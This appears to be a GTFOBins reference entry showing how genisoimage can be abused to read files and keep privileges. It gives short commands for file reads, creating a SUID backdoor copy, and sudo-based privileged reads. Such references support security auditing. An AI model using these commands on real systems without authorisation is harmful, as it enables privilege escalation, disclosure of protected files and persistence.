# GTFOBin: genisoimage

The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
genisoimage -q -o - "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.

```
sudo install -m =xs $(which genisoimage) .

LFILE=file_to_read
./genisoimage -sort "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo genisoimage -q -o - "$LFILE"
```